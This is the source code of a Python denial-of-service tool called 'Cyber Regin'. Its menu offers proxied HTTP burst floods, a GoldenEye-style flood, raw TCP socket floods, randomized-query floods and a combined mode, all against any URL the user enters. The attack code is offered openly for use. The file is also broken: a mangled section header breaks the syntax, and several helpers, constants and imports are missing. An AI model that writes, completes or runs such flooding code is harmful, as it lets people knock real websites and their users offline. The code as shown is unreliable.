import os
import random
import socket
import threading
import time
import sys

# === CONFIGURATION === #
PROXY_FILE = "proxies.txt"
FAKE_UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
]

# === COLORS === #
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
W = "\033[97m"
RESET = "\033[0m"

# === SOUND FUNCTION === #
def play_hacking_sound():
    """
    Termux এর জন্য: `pkg install mpv` এবং স্ক্রিপ্টের ফোল্ডারে `hack_sound.mp3` রাখতে হবে।
    Windows এর জন্য: অটোমেটিক বীপ সাউন্ড হবে।
    """
    try:
        if os.name == 'nt':
            import winsound
            winsound.Beep(1000, 200)
            time.sleep(0.1)
            winsound.Beep(2000, 400)
        else:
            # Termux/Linux background sound
            os.system("mpv hack_sound.mp3 > /dev/null 2>&1 &") 
    except:
        pass

# === HELPER FUNCTIONS === #
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# === INTRO & BANNER === #
def show_intro():
    # সাউন্ড চালু করা হচ্ছে
    threading.Thread(target=play_hacking_sound).start()
    
    clear_screen()
    print(f"{C}\n    Loading Cyber Regin System...\n    [■■■□□□□□□□] 30%")
    time.sleep(0.5)
    clear_screen()
    print(f"{C}\n    Loading Cyber Regin System...\n    [■■■■■■■□□□] 70%")
    time.sleep(0.5)
    clear_screen()
    print(f"{G}\n    Loading Cyber Regin System...\n    [■■■■■■■■■■] 100% - ACCESS GRANTED")
    time.sleep(0.8)
    clear_screen()

def show_banner():
    clear_screen()
    banner_art = f"""{C}
      ______      __               ____             _       
     / ____/_  __/ /_  ___  _____ / __ \___  ____ _(_)___  
    / /   / / / / __ \/ _ \/ ___// /_/ / _ \/ __ `/ / __ \ 
   / /___/ /_/ / /_/ /  __/ /   / _, _/  __/ /_/ / / / / / 
   \____/\__, /_.___/\___/_/   /_/ |_|\___/\__, /_/_/ /_/  
        /____/                            /____/           
    {RESET}"""
    print(banner_art)
    print(f"{R}╔════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}                 WELCOME TO CYBER REGIN TOOLS               {R}║{RESET}")
    print(f"{R}╠════════════════════════════════════════════════════════════╣{RESET}")
    print(f"{R}║{Y}  [+] DEVELOPER : {W}MAIM YEAGER                               {R}║{RESET}")
    print(f"{R}║{Y}  [+] TEAM      : {W}CR CYBER REGIN                            {R}║{RESET}")
    print(f"{R}║{Y}  [+] CEO       : {W}ALIF ROHMAN                               {R}║{RESET}")
    print(f"{R}║{Y}  [+] STATUS    : {G}PREMIUM & ACTIVE                          {R}║{RESET}")
    print(f"{R}╚════════════════════════════════════════════════════════════╝{RESET}")
    print(f"\n{B} ==> SYSTEM IS READY...{RESET}\n")
     === ATTACK MODES === #
def http_flood(domain, url, proxies=None):
    def flood():
        end_time = time.time() + ATTACK_DURATION
        while time.time() < end_time:
            try:
                headers = generate_headers(domain)
                proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
                for _ in range(BURST_REQUESTS):
                    requests.get(url, headers=headers, proxies=proxy, timeout=5)
                print(f"\033[92m[⚔️] HTTP Burst sent to {url}\033[0m")
            except:
                pass
    for _ in range(NUM_THREADS):
        threading.Thread(target=flood).start()

def goldeneye_flood(url, proxies=None):
    def golden():
        end_time = time.time() + ATTACK_DURATION
        while time.time() < end_time:
            try:
                headers = generate_headers(urlparse(url).netloc)
                proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
                requests.get(url, headers=headers, proxies=proxy, timeout=3)
                print(f"\033[94m[🌀] GoldenEye packet sent to {url}\033[0m")
            except:
                pass
    for _ in range(NUM_THREADS):
        threading.Thread(target=golden).start()

def socket_flood(domain, ip):
    def raw_socket():
        end_time = time.time() + ATTACK_DURATION
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, 80))
                s.send(f"GET / HTTP/1.1\r\nHost: {domain}\r\n\r\n".encode())
                s.close()
                print(f"\033[91m[🔌] Raw TCP packet sent to {ip}\033[0m")
            except:
                pass
    for _ in range(NUM_THREADS):
        threading.Thread(target=raw_socket).start()

def payload_randomizer_attack(domain, url):
    def randomized():
        end_time = time.time() + ATTACK_DURATION
        while time.time() < end_time:
            try:
                rand_url = url + f"?q={random.randint(1000,9999)}&t={random.random()}"
                headers = generate_headers(domain)
                requests.get(rand_url, headers=headers, timeout=3)
                print(f"\033[93m[🎲] Randomized payload sent to {rand_url}\033[0m")
            except:
                pass
    for _ in range(NUM_THREADS):
        threading.Thread(target=randomized).start()

# === INTERACTIVE MENU === #
def start_ui():
    show_banner()
    proxies = load_proxies()
    if proxies:
        print(f"\033[90m[📡] Loaded {len(proxies)} proxies from '{PROXY_FILE}'\033[0m")

    print("\033[96m")
    print("╔════════════════════════════════════════════╗")
    print("║        🔥 RF POWERFUL DDOS TOOLS MENU 🔥      ║")
    print("╠════════════════════════════════════════════╣")
    print("║ [1] Ultra HTTP Burst (Spoof + Proxy)      ║")
    print("║ [2] Global Layer 7 (Proxy Flood)       ║")
    print("║ [3] Unlimited Ulrta Attack                 ║")
    print("║ [4] Random Payload Mutation               ║")
    print("║ [5] MASSIVE MODE (All combined)          ║")
    print("║ [6] Join Our Community                                 ║")
    print("╚════════════════════════════════════════════╝")
    print("\033[0m")

    try:
        choice = input("🧠 Choose your Attack Mode (1-6): ").strip()
       # if choice == "6":
        # os.system('xdg-open https://t.me/+n-KPxPtkjiI1M2I1 ')
       # print("👋 Exiting...")
       # return

          
          
        target = input("🎯 Enter Target URL: ").strip()
    except (EOFError, OSError):
        print("[⚠️] Input not supported in this environment. Exiting.")
        return

    domain, ip = resolve_target(target)
    if not ip:
        print("\033[91m[❌] Could not resolve IP.\033[0m")
        return

    print(f"\n\033[93m[✔️] Domain: {domain}")
    print(f"[🌐] IP Address: {ip}")
    print(f"[🚀] Launching {NUM_THREADS} threads for {ATTACK_DURATION}s...\033[0m\n")

    if choice == "1":
        http_flood(domain, target, proxies)
    elif choice == "2":
        goldeneye_flood(target, proxies)
    elif choice == "3":
        socket_flood(domain, ip)
    elif choice == "4":
        payload_randomizer_attack(domain, target)
    elif choice == "5":
        http_flood(domain, target, proxies)
        goldeneye_flood(target, proxies)
        socket_flood(domain, ip)
        payload_randomizer_attack(domain, target)
    else:
        print("\033[91m[❌] Invalid choice.\033[0m")
#    if choice == "6":
#            #  print("👋 Exiting...")
#               
#            
#       os.system('xdg-open https://t.me/+n-KPxPtkjiI1M2I1 ')
#       print("👋 Exiting...")
#       return

# === RUN === #
if __name__ == '__main__':
    start_ui()
